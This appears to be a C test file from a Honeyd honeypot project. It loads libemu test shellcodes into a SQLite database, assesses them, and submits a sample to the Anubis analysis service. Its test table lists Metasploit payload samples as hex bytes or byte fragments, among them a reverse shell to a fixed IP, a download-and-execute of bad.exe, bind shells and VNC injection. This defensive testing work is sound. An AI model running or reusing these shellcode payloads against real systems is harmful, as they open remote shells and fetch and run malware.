...
// stolen from libemu's tests.{c,h}
struct instr_test
{
	const char *instr;
		...
		{
				{
						...
						.codesize = 317, .in_state.reg =
						{ 0, 0x71ab675b, 0x71ac4070, 0, 0x22ccb0, 0x22cd98,
								0x611001a0, 0x401380 },	// ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{
						.instr =
						...
						.codesize = 344, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{
				...
				{
						.instr =
								"win32_bind -  EXITFUNC=seh LPORT=4444 Size=349 Encoder=JmpCallAdditive http://metasploit.com",
						.code =
				...
				{
						.instr =
								"win32_reverse -  EXITFUNC=seh LHOST=216.75.15.231 LPORT=4321 Size=287 Encoder=None http://metasploit.com",
						.code =
								"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
										"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
										"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
				...
				{
						.instr =
								"win32_downloadexec -  URL=http://nepenthes.mwcollect.org/bad.exe Size=378 Encoder=None http://metasploit.com",
						.code =
				...
				{
						.instr =
								"win32_exec -  EXITFUNC=seh CMD=cmd -c ftp.exe -s foo.scripted_sequence; echo der fox hat die gans gezogen  Size=205 Encoder=None http://metasploit.com",
						.code =
				...
				{
						.instr =
								"win32_bind pex & ./clet -S win32_bind_pex -b 50 -t -B -c -f ../spectrum/stat2 -a -n 123",
						.code =
				...
				{
						.instr =
								"clet decoded nop slide (144 0x90 decoded with ./clet -S 144nop -b 50 -t -B -c -f ../spectrum/stat2 -a -n 123) ",
						.code =
				...
				{
						.instr =
								"win32_bind_vncinject -  VNCDLL=/home/opcode/msfweb/framework/data/vncdll.dll EXITFUNC=seh AUTOVNC=1 VNCPORT=5900 LPORT=4444 Size=287 Encoder=None http://metasploit.com",
						.code =
				...
				{
						.instr =
								"windows/vncinject/reverse_tcp - 177 bytes (stage 1) http://www.metasploit.com DisableCourtesyShell=false, VNCHOST=127.0.0.1, VNCPORT=5900, EXITFUNC=seh, DLL=/tmp/framework-3.0/data/vncdll.dll, LPORT=4444, LHOST=192.168.53.20, AUTOVNC=true",
						.code =
				...
				{
						.instr =
								"Windows bindshell 0.0.0.0:8594 - tried exploit PNP_QueryResConfList/MS05-39",
						.code =
								"\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00\x4d\x00\x5c\x00\x30" //|.S.Y.S.T.E.M.\.0|
				...
				{
						.instr =
								"Windows bind filetransfer 0.0.0.0:38963 - tried to exploit DsRolerUpgradeDownlevelServer/MS04-11",
						.code =
						...
						.codesize = 458, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{ .instr = "libemu dos", .code = "\xe3\xfe\xe8", .codesize = 3,
						.in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
				...
				{
						.instr =
								"windows/shell_bind_tcp AutoRunScript=, EXITFUNC=process, InitialAutoRunScript=, LPORT=4444, RHOST= http://www.metasploit.com",
						.code =
						...
						.codesize = 341, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{ .instr = "crash in loadlibrary", .code =
						"\x6A\xFE\xB8\x77\x1D\x80\x7C\xFF\xD0", .codesize = 9,
						.in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
				...
				{ .instr = "crash in fwrite",
						.code =
								"\x6A\xFE\x6A\xFE\x6A\xFE\x6A\xFE\xB8\x3B\x17\xC1\x77\xFF\xD0",
						.codesize = 15, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{ .instr = "crash in lwrite/hwrite",
						.code =
								"\x6A\xFE\x6A\xFE\x6A\xFE\x6A\xFE\xB8\xE7\x8A\x83\x7C\xFF\xD0\x00\x00\x00",
						.codesize = 18, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{ .instr = "crash in malloc",
						.code =
								"\x6A\xFE\x6A\xFE\xB8\x07\xC4\xBF\x77\xFF\xD0\x00\x00\x00\x00\x00\x00\x00\x00",
						.codesize = 19, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				{ .instr = "crash in send",
						.code =
								"\x6A\xFE\x6A\xFE\xB8\x8A\x42\xA1\x71\xFF\xD0\x00\x00\x00",
						.codesize = 14, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, },
				...
				{ .instr = "crash in execve",
						.code =
								"\xB8\xFF\xFF\xFF\xFF\xBB\xFF\xFF\xFF\xFF\xB9\xFF\xFF\xFF\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\x6A\xFF\xB0\x0B\xCD\x80\xCC",
						.codesize = 40, .in_state.reg =
						{ 0, 0xfffffe6c, 0, 0, 0x12fe98, 0x12ff74, 0x12fe9c,
								0x12ff74 }, // ollydbg
						.in_state.mem_state =
						{ 0, 0 }, }, };

int test_payload(sqlite3* db)
{

	char* mybuf = "Hi there, this even has some non printable stuff:\1";
	shellcode_hex_dump("before:", mybuf, strlen(mybuf));

	// first, delete everything from db
	database_query("DELETE FROM payload;", NULL );

	// log the payload
	log_payload(mybuf, strlen(mybuf));

	// try to get it back
	sqlite3_stmt* statement;
	int retval = sqlite3_prepare_v2(db, "SELECT * FROM payload;", -1,
			&statement, NULL );

	if (retval != SQLITE_OK || statement == NULL )
	{
		printf("Error here! %d, statement is %d\n", retval, statement);
	...
	while (1)
	{
		...
		if (step_type == SQLITE_ROW)
		{
			...
			int res_len = sqlite3_column_bytes(statement, 1);
			char* result = sqlite3_column_blob(statement, 1);

			shellcode_hex_dump("after:", result, res_len);
		...
		{
			printf("Error stepping through the result set.\n");
			exit(EXIT_FAILURE);
		}
...
void test_assess_shellcode(sqlite3* db)
{

	printf("start testing assess shellcode\n");
	shellcode_init();

	database_assess_payloads(db);

}

void test_submit_to_anubis()
{

	printf("Inside test_submit_to_anubis.\n");
	submission_init();

	submit_to_anubis("./test1.exe");
	struct result_buffer* arb = submission_current_result();

	printf("I've just submitted stuff to anubis. the result url is here: %s\n",
			arb->parsed_url);
	printf("And here's another test for current_url: %s\n",
			submission_current_url());
	submission_destroy();

}

void test_shellcode_convert()
{

	char* result = shellcode_convert("hallo", strlen("hallo") + 1);
	printf("md5sum inside %s\n", result);
	free(result);

}

// writes the test-shellcodes from libemus sctest into our database
void shellcodes_to_db(sqlite3* db)
{
	int i, num_shellcodes = sizeof(tests) / sizeof(struct instr_test);
	printf("Logging Shellcode ");
	for (i = 0; i < num_shellcodes; i++)
	{
		log_payload(tests[i].code, tests[i].codesize);
		printf("%d ", i);
	}
	printf("... Done.\n");
}

int shellcode_test_main()
{

	printf("Honeyd Test Starting.\n");

	char* filename = "./database/honeyd.db";
	database_init(filename);

	if (database_check_tables() != 0)
	{
		if (database_delete_database(filename) == 0)
		{
			database_init(filename);
	...
	database_submit_payloads();

	//test_shellcode_convert();
	//shellcodes_to_db(db);
	exit(0);
	//test_submit_to_anubis();   

	//test_assess_shellcode(db);

	/*
	 printf("start testing payload\n");
	 test_payload(db);

	 
	 // create a v4 tcp connection
	 struct tcp_con* tcp_con_v4;
	 if ((tcp_con_v4 = calloc(1, sizeof(struct tcp_con))) == NULL) {
	 printf("Error creating TCPv4 connection at %s:%d\n", __FILE__, __LINE__);
	 exit(EXIT_FAILURE);
	 }
	 
	 tcp_con_v4->addr_family = AF_INET;
	 tcp_con_v4->conhdr.ip_src = 0x0100a8c0; // 192.168.0.1
	 tcp_con_v4->conhdr.ip_dst = 0x0200a8c0; // 192.168.0.2  
	 tcp_con_v4->conhdr.sport = 64000;
	 tcp_con_v4->conhdr.dport = 80;
	 tcp_con_v4->conhdr.type = SOCK_STREAM;
	 
	 printf("Successfully created TCPv4 connection.\n");
	 int tcp_v4_id = log_transport_layer(db, &(tcp_con_v4->conhdr));

	 struct udp_con* udp_con_v4;
	 if ((udp_con_v4 = calloc(1, sizeof(struct udp_con))) == NULL) {
	 printf("Error creating UDPv4 connection at %s:%d\n", __FILE__, __LINE__);
	 exit(EXIT_FAILURE);
	 }

	 udp_con_v4->addr_family = AF_INET;
	 udp_con_v4->conhdr.ip_src = 0x01FFa8c0;
	 udp_con_v4->conhdr.ip_dst = 0x02FFa8c0;
	 udp_con_v4->conhdr.sport = 54000;
	 udp_con_v4->conhdr.dport = 21;
	 udp_con_v4->conhdr.type = SOCK_DGRAM;

	 printf("Successfully created UDPv4 connection.\n");
	 int udp_v4_id = log_transport_layer(db, &(udp_con_v4->conhdr));

	 log_network_layer(db, NULL, NULL, 0); 
	 log_network_layer(db, tcp_con_v4, udp_con_v4, 0);
	 log_network_layer(db, tcp_con_v4, NULL, tcp_v4_id);
	 log_network_layer(db, NULL, udp_con_v4, udp_v4_id);

	 struct tcp_con* tcp_con_v6;
	 if((tcp_con_v6 = calloc(1, sizeof(struct tcp_con))) == NULL) {
	 printf("Error creating TCPv6 connection at %s:%d\n", __FILE__, __LINE__);
	 exit(EXIT_FAILURE);
	 }

	 tcp_con_v6->addr_family = AF_INET6;
	 addr_pton("2001:db8::1", &(tcp_con_v6->conhdr.src_addr));
	 //tcp_con_v6->dst_addr = 0x20010db8000000000000000000000002;
	 tcp_con_v6->conhdr.sport = 40000;
	 tcp_con_v6->conhdr.dport = 81;
	 tcp_con_v6->conhdr.type = SOCK_STREAM;

	 log_network_layer(db, tcp_con_v6, NULL, 0);
